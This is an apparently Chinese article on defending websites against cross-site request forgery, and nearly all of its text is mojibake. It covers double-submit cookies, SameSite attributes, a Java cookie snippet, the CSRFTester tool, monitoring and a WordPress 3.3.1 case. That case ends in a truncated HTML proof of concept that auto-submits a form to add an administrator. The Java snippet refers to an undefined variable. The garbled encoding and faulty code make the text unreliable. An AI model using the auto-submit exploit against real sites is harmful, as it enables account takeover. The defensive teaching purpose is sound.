ä¸ºä»€ä¹ˆå¾ˆå¤šé“¶è¡Œç­‰ç½‘ç«™ä¼šè¦æ±‚å·²ç»ç™»å½•çš„ç”¨æˆ·åœ¨è½¬è´¦æ—¶å†æ¬¡è¾“å…¥å¯†ç ï¼Œç°åœ¨æ˜¯ä¸æ˜¯æœ‰ä¸€å®šé“ç†äº†ï¼Ÿ åŒé‡CookieéªŒè¯åœ¨ä¼šè¯ä¸­å­˜å‚¨CSRF Tokenæ¯”è¾ƒç¹çï¼Œè€Œä¸”ä¸èƒ½åœ¨é€šç”¨çš„æ‹¦æˆªä¸Šç»Ÿä¸€å¤„ç†æ‰€æœ‰çš„æ¥å£ã€‚ é‚£ä¹ˆå¦ä¸€ç§é˜²å¾¡æªæ–½æ˜¯ä½¿ç”¨åŒé‡æäº¤Cookieã€‚åˆ©ç”¨CSRFæ”»å‡»ä¸èƒ½è·å–åˆ°ç”¨æˆ·Cookieçš„ç‰¹ç‚¹ï¼Œæˆ‘ä»¬å¯ä»¥è¦æ±‚Ajaxå’Œè¡¨å•è¯·æ±‚æºå¸¦ä¸€ä¸ªCookieä¸­çš„å€¼ã€‚ åŒé‡Cookieé‡‡ç”¨ä»¥ä¸‹æµç¨‹ï¼š åœ¨ç”¨æˆ·è®¿é—®ç½‘ç«™é¡µé¢æ—¶ï¼Œå‘è¯·æ±‚åŸŸåæ³¨å…¥ä¸€ä¸ªCookieï¼Œå†…å®¹ä¸ºéšæœºå­—ç¬¦ä¸²ï¼ˆä¾‹å¦‚csrfcookie=v8g9e4ksfhwï¼‰ã€‚ åœ¨å‰ç«¯å‘åç«¯å‘èµ·è¯·æ±‚æ—¶ï¼Œå–å‡ºCookieï¼Œå¹¶æ·»åŠ åˆ°URLçš„å‚æ•°ä¸­ï¼ˆæ¥ä¸Šä¾‹POST https://www.a.com/comment?csrfcookie=v8g9e4ksfhwï¼‰ã€‚ åç«¯æ¥å£éªŒè¯Cookieä¸­çš„å­—æ®µä¸URLå‚æ•°ä¸­çš„å­—æ®µæ˜¯å¦ä¸€è‡´ï¼Œä¸ä¸€è‡´åˆ™æ‹’ç»ã€‚ æ­¤æ–¹æ³•ç›¸å¯¹äºCSRF Tokenå°±ç®€å•äº†è®¸å¤šã€‚å¯ä»¥ç›´æ¥é€šè¿‡å‰åç«¯æ‹¦æˆªçš„çš„æ–¹æ³•è‡ªåŠ¨åŒ–å®ç°ã€‚åç«¯æ ¡éªŒä¹Ÿæ›´åŠ æ–¹ä¾¿ï¼Œåªéœ€è¿›è¡Œè¯·æ±‚ä¸­å­—æ®µçš„å¯¹æ¯”ï¼Œè€Œä¸éœ€è¦å†è¿›è¡ŒæŸ¥è¯¢å’Œå­˜å‚¨Tokenã€‚ å½“ç„¶ï¼Œæ­¤æ–¹æ³•å¹¶æ²¡æœ‰å¤§è§„æ¨¡åº”ç”¨ï¼Œå…¶åœ¨å¤§å‹ç½‘ç«™ä¸Šçš„å®‰å…¨æ€§è¿˜æ˜¯æ²¡æœ‰CSRF Tokené«˜ï¼ŒåŸå› æˆ‘ä»¬ä¸¾ä¾‹è¿›è¡Œè¯´æ˜ã€‚ ç”±äºä»»ä½•è·¨åŸŸéƒ½ä¼šå¯¼è‡´å‰ç«¯æ— æ³•è·å–Cookieä¸­çš„å­—æ®µï¼ˆåŒ…æ‹¬å­åŸŸåä¹‹é—´ï¼‰ï¼Œäºæ˜¯å‘ç”Ÿäº†å¦‚ä¸‹æƒ…å†µï¼š å¦‚æœç”¨æˆ·è®¿é—®çš„ç½‘ç«™ä¸ºwww.a.comï¼Œè€Œåç«¯çš„apiåŸŸåä¸ºapi.a.comã€‚é‚£ä¹ˆåœ¨www.a.comä¸‹ï¼Œå‰ç«¯æ‹¿ä¸åˆ°api.a.comçš„Cookieï¼Œä¹Ÿå°±æ— æ³•å®ŒæˆåŒé‡Cookieè®¤è¯ã€‚ äºæ˜¯è¿™ä¸ªè®¤è¯Cookieå¿…é¡»è¢«ç§åœ¨a.comä¸‹ï¼Œè¿™æ ·æ¯ä¸ªå­åŸŸéƒ½å¯ä»¥è®¿é—®ã€‚ ä»»ä½•ä¸€ä¸ªå­åŸŸéƒ½å¯ä»¥ä¿®æ”¹a.comä¸‹çš„Cookieã€‚ æŸä¸ªå­åŸŸåå­˜åœ¨æ¼æ´è¢«XSSæ”»å‡»ï¼ˆä¾‹å¦‚upload.a.comï¼‰ã€‚è™½ç„¶è¿™ä¸ªå­åŸŸä¸‹å¹¶æ²¡æœ‰ä»€ä¹ˆå€¼å¾—çªƒå–çš„ä¿¡æ¯ã€‚ä½†æ”»å‡»è€…ä¿®æ”¹äº†a.comä¸‹çš„Cookieã€‚ æ”»å‡»è€…å¯ä»¥ç›´æ¥ä½¿ç”¨è‡ªå·±é…ç½®çš„Cookieï¼Œå¯¹XSSä¸­æ‹›çš„ç”¨æˆ·å†å‘www.a.comä¸‹ï¼Œå‘èµ·CSRFæ”»å‡»ã€‚ æ€»ç»“ï¼šç”¨åŒé‡Cookieé˜²å¾¡CSRFçš„ä¼˜ç‚¹ï¼š æ— éœ€ä½¿ç”¨Sessionï¼Œé€‚ç”¨é¢æ›´å¹¿ï¼Œæ˜“äºå®æ–½ã€‚ Tokenå‚¨å­˜äºå®¢æˆ·ç«¯ä¸­ï¼Œä¸ä¼šç»™æœåŠ¡å™¨å¸¦æ¥å‹åŠ›ã€‚ ç›¸å¯¹äºTokenï¼Œå®æ–½æˆæœ¬æ›´ä½ï¼Œå¯ä»¥åœ¨å‰åç«¯ç»Ÿä¸€æ‹¦æˆªæ ¡éªŒï¼Œè€Œä¸éœ€è¦ä¸€ä¸ªä¸ªæ¥å£å’Œé¡µé¢æ·»åŠ ã€‚ ç¼ºç‚¹ï¼š Cookieä¸­å¢åŠ äº†é¢å¤–çš„å­—æ®µã€‚ å¦‚æœæœ‰å…¶ä»–æ¼æ´ï¼ˆä¾‹å¦‚XSSï¼‰ï¼Œæ”»å‡»è€…å¯ä»¥æ³¨å…¥Cookieï¼Œé‚£ä¹ˆè¯¥é˜²å¾¡æ–¹å¼å¤±æ•ˆã€‚ éš¾ä»¥åšåˆ°å­åŸŸåçš„éš”ç¦»ã€‚ ä¸ºäº†ç¡®ä¿Cookieä¼ è¾“å®‰å…¨ï¼Œé‡‡ç”¨è¿™ç§é˜²å¾¡æ–¹å¼çš„æœ€å¥½ç¡®ä¿ç”¨æ•´ç«™HTTPSçš„æ–¹å¼ï¼Œå¦‚æœè¿˜æ²¡åˆ‡HTTPSçš„ä½¿ç”¨è¿™ç§æ–¹å¼ä¹Ÿä¼šæœ‰é£é™©ã€‚ Samesite Cookieå±æ€§é˜²æ­¢CSRFæ”»å‡»çš„åŠæ³•å·²ç»æœ‰ä¸Šé¢çš„é¢„é˜²æªæ–½ã€‚ä¸ºäº†ä»æºå¤´ä¸Šè§£å†³è¿™ä¸ªé—®é¢˜ï¼ŒGoogleèµ·è‰äº†ä¸€ä»½è‰æ¡ˆæ¥æ”¹è¿›HTTPåè®®ï¼Œé‚£å°±æ˜¯ä¸ºSet-Cookieå“åº”å¤´æ–°å¢Samesiteå±æ€§ï¼Œå®ƒç”¨æ¥æ ‡æ˜è¿™ä¸ª Cookieæ˜¯ä¸ªâ€œåŒç«™ Cookieâ€ï¼ŒåŒç«™Cookieåªèƒ½ä½œä¸ºç¬¬ä¸€æ–¹Cookieï¼Œä¸èƒ½ä½œä¸ºç¬¬ä¸‰æ–¹Cookieï¼ŒSamesite æœ‰ä¸¤ä¸ªå±æ€§å€¼ï¼Œåˆ†åˆ«æ˜¯ Strict å’Œ Laxï¼Œä¸‹é¢åˆ†åˆ«è®²è§£ï¼š Samesite=Strictè¿™ç§ç§°ä¸ºä¸¥æ ¼æ¨¡å¼ï¼Œè¡¨æ˜è¿™ä¸ª Cookie åœ¨ä»»ä½•æƒ…å†µä¸‹éƒ½ä¸å¯èƒ½ä½œä¸ºç¬¬ä¸‰æ–¹ Cookieï¼Œç»æ— ä¾‹å¤–ã€‚æ¯”å¦‚è¯´ b.com è®¾ç½®äº†å¦‚ä¸‹ Cookieï¼š 123Set-Cookie: foo=1; Samesite=StrictSet-Cookie: bar=2; Samesite=LaxSet-Cookie: baz=3 æˆ‘ä»¬åœ¨ a.com ä¸‹å‘èµ·å¯¹ b.com çš„ä»»æ„è¯·æ±‚ï¼Œfoo è¿™ä¸ª Cookie éƒ½ä¸ä¼šè¢«åŒ…å«åœ¨ Cookie è¯·æ±‚å¤´ä¸­ï¼Œä½† bar ä¼šã€‚ä¸¾ä¸ªå®é™…çš„ä¾‹å­å°±æ˜¯ï¼Œå‡å¦‚æ·˜å®ç½‘ç«™ç”¨æ¥è¯†åˆ«ç”¨æˆ·ç™»å½•ä¸å¦çš„ Cookie è¢«è®¾ç½®æˆäº† Samesite=Strictï¼Œé‚£ä¹ˆç”¨æˆ·ä»ç™¾åº¦æœç´¢é¡µé¢ç”šè‡³å¤©çŒ«é¡µé¢çš„é“¾æ¥ç‚¹å‡»è¿›å…¥æ·˜å®åï¼Œæ·˜å®éƒ½ä¸ä¼šæ˜¯ç™»å½•çŠ¶æ€ï¼Œå› ä¸ºæ·˜å®çš„æœåŠ¡å™¨ä¸ä¼šæ¥å—åˆ°é‚£ä¸ª Cookieï¼Œå…¶å®ƒç½‘ç«™å‘èµ·çš„å¯¹æ·˜å®çš„ä»»æ„è¯·æ±‚éƒ½ä¸ä¼šå¸¦ä¸Šé‚£ä¸ª Cookieã€‚ Samesite=Laxè¿™ç§ç§°ä¸ºå®½æ¾æ¨¡å¼ï¼Œæ¯” Strict æ”¾å®½äº†ç‚¹é™åˆ¶ï¼šå‡å¦‚è¿™ä¸ªè¯·æ±‚æ˜¯è¿™ç§è¯·æ±‚ï¼ˆæ”¹å˜äº†å½“å‰é¡µé¢æˆ–è€…æ‰“å¼€äº†æ–°é¡µé¢ï¼‰ä¸”åŒæ—¶æ˜¯ä¸ªGETè¯·æ±‚ï¼Œåˆ™è¿™ä¸ªCookieå¯ä»¥ä½œä¸ºç¬¬ä¸‰æ–¹Cookieã€‚æ¯”å¦‚è¯´ b.comè®¾ç½®äº†å¦‚ä¸‹Cookieï¼š 123Set-Cookie: foo=1; Samesite=StrictSet-Cookie: bar=2; Samesite=LaxSet-Cookie: baz=3 å½“ç”¨æˆ·ä» a.com ç‚¹å‡»é“¾æ¥è¿›å…¥ b.com æ—¶ï¼Œfoo è¿™ä¸ª Cookie ä¸ä¼šè¢«åŒ…å«åœ¨ Cookie è¯·æ±‚å¤´ä¸­ï¼Œä½† bar å’Œ baz ä¼šï¼Œä¹Ÿå°±æ˜¯è¯´ç”¨æˆ·åœ¨ä¸åŒç½‘ç«™ä¹‹é—´é€šè¿‡é“¾æ¥è·³è½¬æ˜¯ä¸å—å½±å“äº†ã€‚ä½†å‡å¦‚è¿™ä¸ªè¯·æ±‚æ˜¯ä» a.com å‘èµ·çš„å¯¹ b.com çš„å¼‚æ­¥è¯·æ±‚ï¼Œæˆ–è€…é¡µé¢è·³è½¬æ˜¯é€šè¿‡è¡¨å•çš„ post æäº¤è§¦å‘çš„ï¼Œåˆ™barä¹Ÿä¸ä¼šå‘é€ã€‚ ç”ŸæˆTokenæ”¾åˆ°Cookieä¸­å¹¶ä¸”è®¾ç½®Cookieçš„Samesiteï¼ŒJavaä»£ç å¦‚ä¸‹ï¼š 123456789private void addTokenCookieAndHeader(HttpServletRequest httpRequest, HttpServletResponse httpResponse) &#123; //ç”Ÿæˆtoken String sToken = this.generateToken(); //æ‰‹åŠ¨æ·»åŠ Cookieå®ç°æ”¯æŒâ€œSamesite=strictâ€ //Cookieæ·»åŠ åŒé‡éªŒè¯ String CookieSpec = String.format("%s=%s; Path=%s; HttpOnly; Samesite=Strict", this.determineCookieName(httpRequest), sToken, httpRequest.getRequestURI()); httpResponse.addHeader("Set-Cookie", CookieSpec); httpResponse.setHeader(CSRF_TOKEN_NAME, token); &#125; ä»£ç æºè‡ªOWASP Cross-Site_Request_Forgery #Implementation example æˆ‘ä»¬åº”è¯¥å¦‚ä½•ä½¿ç”¨SamesiteCookieå¦‚æœSamesiteCookieè¢«è®¾ç½®ä¸ºStrictï¼Œæµè§ˆå™¨åœ¨ä»»ä½•è·¨åŸŸè¯·æ±‚ä¸­éƒ½ä¸ä¼šæºå¸¦Cookieï¼Œæ–°æ ‡ç­¾é‡æ–°æ‰“å¼€ä¹Ÿä¸æºå¸¦ï¼Œæ‰€ä»¥è¯´CSRFæ”»å‡»åŸºæœ¬æ²¡æœ‰æœºä¼šã€‚ ä½†æ˜¯è·³è½¬å­åŸŸåæˆ–è€…æ˜¯æ–°æ ‡ç­¾é‡æ–°æ‰“å¼€åˆšç™»é™†çš„ç½‘ç«™ï¼Œä¹‹å‰çš„Cookieéƒ½ä¸ä¼šå­˜åœ¨ã€‚å°¤å…¶æ˜¯æœ‰ç™»å½•çš„ç½‘ç«™ï¼Œé‚£ä¹ˆæˆ‘ä»¬æ–°æ‰“å¼€ä¸€ä¸ªæ ‡ç­¾è¿›å…¥ï¼Œæˆ–è€…è·³è½¬åˆ°å­åŸŸåçš„ç½‘ç«™ï¼Œéƒ½éœ€è¦é‡æ–°ç™»å½•ã€‚å¯¹äºç”¨æˆ·æ¥è®²ï¼Œå¯èƒ½ä½“éªŒä¸ä¼šå¾ˆå¥½ã€‚ å¦‚æœSamesiteCookieè¢«è®¾ç½®ä¸ºLaxï¼Œé‚£ä¹ˆå…¶ä»–ç½‘ç«™é€šè¿‡é¡µé¢è·³è½¬è¿‡æ¥çš„æ—¶å€™å¯ä»¥ä½¿ç”¨Cookieï¼Œå¯ä»¥ä¿éšœå¤–åŸŸè¿æ¥æ‰“å¼€é¡µé¢æ—¶ç”¨æˆ·çš„ç™»å½•çŠ¶æ€ã€‚ä½†ç›¸åº”çš„ï¼Œå…¶å®‰å…¨æ€§ä¹Ÿæ¯”è¾ƒä½ã€‚ å¦å¤–ä¸€ä¸ªé—®é¢˜æ˜¯Samesiteçš„å…¼å®¹æ€§ä¸æ˜¯å¾ˆå¥½ï¼Œç°é˜¶æ®µé™¤äº†ä»æ–°ç‰ˆChromeå’ŒFirefoxæ”¯æŒä»¥å¤–ï¼ŒSafariä»¥åŠiOS Safariéƒ½è¿˜ä¸æ”¯æŒï¼Œç°é˜¶æ®µçœ‹æ¥æš‚æ—¶è¿˜ä¸èƒ½æ™®åŠã€‚ è€Œä¸”ï¼ŒSamesiteCookieç›®å‰æœ‰ä¸€ä¸ªè‡´å‘½çš„ç¼ºé™·ï¼šä¸æ”¯æŒå­åŸŸã€‚ä¾‹å¦‚ï¼Œç§åœ¨topic.a.comä¸‹çš„Cookieï¼Œå¹¶ä¸èƒ½ä½¿ç”¨a.comä¸‹ç§æ¤çš„SamesiteCookieã€‚è¿™å°±å¯¼è‡´äº†å½“æˆ‘ä»¬ç½‘ç«™æœ‰å¤šä¸ªå­åŸŸåæ—¶ï¼Œä¸èƒ½ä½¿ç”¨SamesiteCookieåœ¨ä¸»åŸŸåå­˜å‚¨ç”¨æˆ·ç™»å½•ä¿¡æ¯ã€‚æ¯ä¸ªå­åŸŸåéƒ½éœ€è¦ç”¨æˆ·é‡æ–°ç™»å½•ä¸€æ¬¡ã€‚ æ€»ä¹‹ï¼ŒSamesiteCookieæ˜¯ä¸€ä¸ªå¯èƒ½æ›¿ä»£åŒæºéªŒè¯çš„æ–¹æ¡ˆï¼Œä½†ç›®å‰è¿˜å¹¶ä¸æˆç†Ÿï¼Œå…¶åº”ç”¨åœºæ™¯æœ‰å¾…è§‚æœ›ã€‚ é˜²æ­¢ç½‘ç«™è¢«åˆ©ç”¨å‰é¢æ‰€è¯´çš„ï¼Œéƒ½æ˜¯è¢«æ”»å‡»çš„ç½‘ç«™å¦‚ä½•åšå¥½é˜²æŠ¤ã€‚è€Œéé˜²æ­¢æ”»å‡»çš„å‘ç”Ÿï¼ŒCSRFçš„æ”»å‡»å¯ä»¥æ¥è‡ªï¼š æ”»å‡»è€…è‡ªå·±çš„ç½‘ç«™ã€‚ æœ‰æ–‡ä»¶ä¸Šä¼ æ¼æ´çš„ç½‘ç«™ã€‚ ç¬¬ä¸‰æ–¹è®ºå›ç­‰ç”¨æˆ·å†…å®¹ã€‚ è¢«æ”»å‡»ç½‘ç«™è‡ªå·±çš„è¯„è®ºåŠŸèƒ½ç­‰ã€‚ å¯¹äºæ¥è‡ªé»‘å®¢è‡ªå·±çš„ç½‘ç«™ï¼Œæˆ‘ä»¬æ— æ³•é˜²æŠ¤ã€‚ä½†å¯¹å…¶ä»–æƒ…å†µï¼Œé‚£ä¹ˆå¦‚ä½•é˜²æ­¢è‡ªå·±çš„ç½‘ç«™è¢«åˆ©ç”¨æˆä¸ºæ”»å‡»çš„æºå¤´å‘¢ï¼Ÿ ä¸¥æ ¼ç®¡ç†æ‰€æœ‰çš„ä¸Šä¼ æ¥å£ï¼Œé˜²æ­¢ä»»ä½•é¢„æœŸä¹‹å¤–çš„ä¸Šä¼ å†…å®¹ï¼ˆä¾‹å¦‚HTMLï¼‰ã€‚ æ·»åŠ Header X-Content-Type-Options: nosniff é˜²æ­¢é»‘å®¢ä¸Šä¼ HTMLå†…å®¹çš„èµ„æºï¼ˆä¾‹å¦‚å›¾ç‰‡ï¼‰è¢«è§£æä¸ºç½‘é¡µã€‚ å¯¹äºç”¨æˆ·ä¸Šä¼ çš„å›¾ç‰‡ï¼Œè¿›è¡Œè½¬å­˜æˆ–è€…æ ¡éªŒã€‚ä¸è¦ç›´æ¥ä½¿ç”¨ç”¨æˆ·å¡«å†™çš„å›¾ç‰‡é“¾æ¥ã€‚ å½“å‰ç”¨æˆ·æ‰“å¼€å…¶ä»–ç”¨æˆ·å¡«å†™çš„é“¾æ¥æ—¶ï¼Œéœ€å‘ŠçŸ¥é£é™©ï¼ˆè¿™ä¹Ÿæ˜¯å¾ˆå¤šè®ºå›ä¸å…è®¸ç›´æ¥åœ¨å†…å®¹ä¸­å‘å¸ƒå¤–åŸŸé“¾æ¥çš„åŸå› ä¹‹ä¸€ï¼Œä¸ä»…ä»…æ˜¯ä¸ºäº†ç”¨æˆ·ç•™å­˜ï¼Œä¹Ÿæœ‰å®‰å…¨è€ƒè™‘ï¼‰ã€‚ CSRFå…¶ä»–é˜²èŒƒæªæ–½å¯¹äºä¸€çº¿çš„ç¨‹åºå‘˜åŒå­¦ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡å„ç§é˜²æŠ¤ç­–ç•¥æ¥é˜²å¾¡CSRFï¼Œå¯¹äºQAã€SREã€å®‰å…¨è´Ÿè´£äººç­‰åŒå­¦ï¼Œæˆ‘ä»¬å¯ä»¥åšå“ªäº›äº‹æƒ…æ¥æå‡å®‰å…¨æ€§å‘¢ï¼Ÿ CSRFæµ‹è¯•CSRFTesteræ˜¯ä¸€æ¬¾CSRFæ¼æ´çš„æµ‹è¯•å·¥å…·ï¼ŒCSRFTesterå·¥å…·çš„æµ‹è¯•åŸç†å¤§æ¦‚æ˜¯è¿™æ ·çš„ï¼Œä½¿ç”¨ä»£ç†æŠ“å–æˆ‘ä»¬åœ¨æµè§ˆå™¨ä¸­è®¿é—®è¿‡çš„æ‰€æœ‰çš„è¿æ¥ä»¥åŠæ‰€æœ‰çš„è¡¨å•ç­‰ä¿¡æ¯ï¼Œé€šè¿‡åœ¨CSRFTesterä¸­ä¿®æ”¹ç›¸åº”çš„è¡¨å•ç­‰ä¿¡æ¯ï¼Œé‡æ–°æäº¤ï¼Œç›¸å½“äºä¸€æ¬¡ä¼ªé€ å®¢æˆ·ç«¯è¯·æ±‚ï¼Œå¦‚æœä¿®æ”¹åçš„æµ‹è¯•è¯·æ±‚æˆåŠŸè¢«ç½‘ç«™æœåŠ¡å™¨æ¥å—ï¼Œåˆ™è¯´æ˜å­˜åœ¨CSRFæ¼æ´ï¼Œå½“ç„¶æ­¤æ¬¾å·¥å…·ä¹Ÿå¯ä»¥è¢«ç”¨æ¥è¿›è¡ŒCSRFæ”»å‡»ã€‚ CSRFTesterä½¿ç”¨æ–¹æ³•å¤§è‡´åˆ†ä¸‹é¢å‡ ä¸ªæ­¥éª¤ï¼š æ­¥éª¤1ï¼šè®¾ç½®æµè§ˆå™¨ä»£ç† CSRFTesteré»˜è®¤ä½¿ç”¨Localhostä¸Šçš„ç«¯å£8008ä½œä¸ºå…¶ä»£ç†ï¼Œå¦‚æœä»£ç†é…ç½®æˆåŠŸï¼ŒCSRFTesterå°†ä¸ºæ‚¨çš„æµè§ˆå™¨ç”Ÿæˆçš„æ‰€æœ‰åç»­HTTPè¯·æ±‚ç”Ÿæˆè°ƒè¯•æ¶ˆæ¯ã€‚ æ­¥éª¤2ï¼šä½¿ç”¨åˆæ³•è´¦æˆ·è®¿é—®ç½‘ç«™å¼€å§‹æµ‹è¯• æˆ‘ä»¬éœ€è¦æ‰¾åˆ°ä¸€ä¸ªæˆ‘ä»¬æƒ³è¦ä¸ºCSRFæµ‹è¯•çš„ç‰¹å®šä¸šåŠ¡Webé¡µé¢ã€‚æ‰¾åˆ°æ­¤é¡µé¢åï¼Œé€‰æ‹©CSRFTesterä¸­çš„â€œå¼€å§‹å½•åˆ¶â€æŒ‰é’®å¹¶æ‰§è¡Œä¸šåŠ¡åŠŸèƒ½ï¼›å®Œæˆåï¼Œç‚¹å‡»CSRFTesterä¸­çš„â€œåœæ­¢å½•åˆ¶â€æŒ‰é’®ï¼›æ­£å¸¸æƒ…å†µä¸‹ï¼Œè¯¥è½¯ä»¶ä¼šå…¨éƒ¨éå†ä¸€éå½“å‰é¡µé¢çš„æ‰€æœ‰è¯·æ±‚ã€‚ æ­¥éª¤3ï¼šé€šè¿‡CSRFä¿®æ”¹å¹¶ä¼ªé€ è¯·æ±‚ ä¹‹åï¼Œæˆ‘ä»¬ä¼šå‘ç°è½¯ä»¶ä¸Šæœ‰ä¸€ç³»åˆ—è·‘å‡ºæ¥çš„è®°å½•è¯·æ±‚ï¼Œè¿™äº›éƒ½æ˜¯æˆ‘ä»¬çš„æµè§ˆå™¨åœ¨æ‰§è¡Œä¸šåŠ¡åŠŸèƒ½æ—¶ç”Ÿæˆçš„æ‰€æœ‰GETæˆ–è€…POSTè¯·æ±‚ã€‚é€šè¿‡é€‰æ‹©åˆ—è¡¨ä¸­çš„æŸä¸€è¡Œï¼Œæˆ‘ä»¬ç°åœ¨å¯ä»¥ä¿®æ”¹ç”¨äºæ‰§è¡Œä¸šåŠ¡åŠŸèƒ½çš„å‚æ•°ï¼Œå¯ä»¥é€šè¿‡ç‚¹å‡»å¯¹åº”çš„è¯·æ±‚ä¿®æ”¹queryå’Œformçš„å‚æ•°ã€‚å½“ä¿®æ”¹å®Œæ‰€æœ‰æˆ‘ä»¬å¸Œæœ›è¯±å¯¼ç”¨æˆ·formæœ€ç»ˆçš„æäº¤å€¼ï¼Œå¯ä»¥é€‰æ‹©å¼€å§‹ç”ŸæˆHTMLæŠ¥å‘Šã€‚ æ­¥éª¤4ï¼šæ‹¿åˆ°ç»“æœå¦‚æœ‰æ¼æ´è¿›è¡Œä¿®å¤ é¦–å…ˆå¿…é¡»é€‰æ‹©â€œæŠ¥å‘Šç±»å‹â€ã€‚æŠ¥å‘Šç±»å‹å†³å®šäº†æˆ‘ä»¬å¸Œæœ›å—å®³è€…æµè§ˆå™¨å¦‚ä½•æäº¤å…ˆå‰è®°å½•çš„è¯·æ±‚ã€‚ç›®å‰æœ‰5ç§å¯èƒ½çš„æŠ¥å‘Šï¼šè¡¨å•ã€iFrameã€IMGã€XHRå’Œé“¾æ¥ã€‚ä¸€æ—¦é€‰æ‹©äº†æŠ¥å‘Šç±»å‹ï¼Œæˆ‘ä»¬å¯ä»¥é€‰æ‹©åœ¨æµè§ˆå™¨ä¸­å¯åŠ¨æ–°ç”Ÿæˆçš„æŠ¥å‘Šï¼Œæœ€åæ ¹æ®æŠ¥å‘Šçš„æƒ…å†µè¿›è¡Œå¯¹åº”çš„æ’æŸ¥å’Œä¿®å¤ã€‚ CSRFç›‘æ§å¯¹äºä¸€ä¸ªæ¯”è¾ƒå¤æ‚çš„ç½‘ç«™ç³»ç»Ÿï¼ŒæŸäº›é¡¹ç›®ã€é¡µé¢ã€æ¥å£æ¼æ‰äº†CSRFé˜²æŠ¤æªæ–½æ˜¯å¾ˆå¯èƒ½çš„ã€‚ ä¸€æ—¦å‘ç”Ÿäº†CSRFæ”»å‡»ï¼Œæˆ‘ä»¬å¦‚ä½•åŠæ—¶çš„å‘ç°è¿™äº›æ”»å‡»å‘¢ï¼Ÿ CSRFæ”»å‡»æœ‰ç€æ¯”è¾ƒæ˜æ˜¾çš„ç‰¹å¾ï¼š è·¨åŸŸè¯·æ±‚ã€‚ GETç±»å‹è¯·æ±‚Headerçš„MIMEç±»å‹å¤§æ¦‚ç‡ä¸ºå›¾ç‰‡ï¼Œè€Œå®é™…è¿”å›Headerçš„MIMEç±»å‹ä¸ºTextã€JSONã€HTMLã€‚ æˆ‘ä»¬å¯ä»¥åœ¨ç½‘ç«™çš„ä»£ç†å±‚ç›‘æ§æ‰€æœ‰çš„æ¥å£è¯·æ±‚ï¼Œå¦‚æœè¯·æ±‚ç¬¦åˆä¸Šé¢çš„ç‰¹å¾ï¼Œå°±å¯ä»¥è®¤ä¸ºè¯·æ±‚æœ‰CSRFæ”»å‡»å«Œç–‘ã€‚æˆ‘ä»¬å¯ä»¥æé†’å¯¹åº”çš„é¡µé¢å’Œé¡¹ç›®è´Ÿè´£äººï¼Œæ£€æŸ¥æˆ–è€… Reviewå…¶CSRFé˜²æŠ¤ç­–ç•¥ã€‚ ä¸ªäººç”¨æˆ·CSRFå®‰å…¨çš„å»ºè®®ç»å¸¸ä¸Šç½‘çš„ä¸ªäººç”¨æˆ·ï¼Œå¯ä»¥é‡‡ç”¨ä»¥ä¸‹æ–¹æ³•æ¥ä¿æŠ¤è‡ªå·±ï¼š ä½¿ç”¨ç½‘é¡µç‰ˆé‚®ä»¶çš„æµè§ˆé‚®ä»¶æˆ–è€…æ–°é—»ä¹Ÿä¼šå¸¦æ¥é¢å¤–çš„é£é™©ï¼Œå› ä¸ºæŸ¥çœ‹é‚®ä»¶æˆ–è€…æ–°é—»æ¶ˆæ¯æœ‰å¯èƒ½å¯¼è‡´æ¶æ„ä»£ç çš„æ”»å‡»ã€‚ å°½é‡ä¸è¦æ‰“å¼€å¯ç–‘çš„é“¾æ¥ï¼Œä¸€å®šè¦æ‰“å¼€æ—¶ï¼Œä½¿ç”¨ä¸å¸¸ç”¨çš„æµè§ˆå™¨ã€‚ æ€»ç»“ç®€å•æ€»ç»“ä¸€ä¸‹ä¸Šæ–‡çš„é˜²æŠ¤ç­–ç•¥ï¼š CSRFè‡ªåŠ¨é˜²å¾¡ç­–ç•¥ï¼šåŒæºæ£€æµ‹ï¼ˆOrigin å’Œ Referer éªŒè¯ï¼‰ã€‚ CSRFä¸»åŠ¨é˜²å¾¡æªæ–½ï¼šTokenéªŒè¯ æˆ–è€… åŒé‡CookieéªŒè¯ ä»¥åŠé…åˆSamesite Cookieã€‚ ä¿è¯é¡µé¢çš„å¹‚ç­‰æ€§ï¼Œåç«¯æ¥å£ä¸è¦åœ¨GETé¡µé¢ä¸­åšç”¨æˆ·æ“ä½œã€‚ ä¸ºäº†æ›´å¥½çš„é˜²å¾¡CSRFï¼Œæœ€ä½³å®è·µåº”è¯¥æ˜¯ç»“åˆä¸Šé¢æ€»ç»“çš„é˜²å¾¡æªæ–½æ–¹å¼ä¸­çš„ä¼˜ç¼ºç‚¹æ¥ç»¼åˆè€ƒè™‘ï¼Œç»“åˆå½“å‰Webåº”ç”¨ç¨‹åºè‡ªèº«çš„æƒ…å†µåšåˆé€‚çš„é€‰æ‹©ï¼Œæ‰èƒ½æ›´å¥½çš„é¢„é˜²CSRFçš„å‘ç”Ÿã€‚ å†å²æ¡ˆä¾‹WordPressçš„CSRFæ¼æ´2012å¹´3æœˆä»½ï¼ŒWordPresså‘ç°äº†ä¸€ä¸ªCSRFæ¼æ´ï¼Œå½±å“äº†WordPress 3.3.1ç‰ˆæœ¬ï¼ŒWordPressæ˜¯ä¼—æ‰€å‘¨çŸ¥çš„åšå®¢å¹³å°ï¼Œè¯¥æ¼æ´å¯ä»¥å…è®¸æ”»å‡»è€…ä¿®æ”¹æŸä¸ªPostçš„æ ‡é¢˜ï¼Œæ·»åŠ ç®¡ç†æƒé™ç”¨æˆ·ä»¥åŠæ“ä½œç”¨æˆ·è´¦æˆ·ï¼ŒåŒ…æ‹¬ä½†ä¸é™äºåˆ é™¤è¯„è®ºã€ä¿®æ”¹å¤´åƒç­‰ç­‰ã€‚å…·ä½“çš„åˆ—è¡¨å¦‚ä¸‹: Add Admin/User Delete Admin/User Approve comment Unapprove comment Delete comment Change background image Insert custom header image Change site title Change administratorâ€™s email Change Wordpress Address Change Site Address é‚£ä¹ˆè¿™ä¸ªæ¼æ´å®é™…ä¸Šå°±æ˜¯æ”»å‡»è€…å¼•å¯¼ç”¨æˆ·å…ˆè¿›å…¥ç›®æ ‡çš„WordPressï¼Œç„¶åç‚¹å‡»å…¶é’“é±¼ç«™ç‚¹ä¸Šçš„æŸä¸ªæŒ‰é’®ï¼Œè¯¥æŒ‰é’®å®é™…ä¸Šæ˜¯è¡¨å•æäº¤æŒ‰é’®ï¼Œå…¶ä¼šè§¦å‘è¡¨å•çš„æäº¤å·¥ä½œï¼Œæ·»åŠ æŸä¸ªå…·æœ‰ç®¡ç†å‘˜æƒé™çš„ç”¨æˆ·ï¼Œå®ç°çš„ç å¦‚ä¸‹ï¼š 12345678910111213141516171819&lt;html&gt; &lt;body onload="javascript:document.forms[0].submit()"&gt; &lt;H2&gt;CSRF Exploit to add 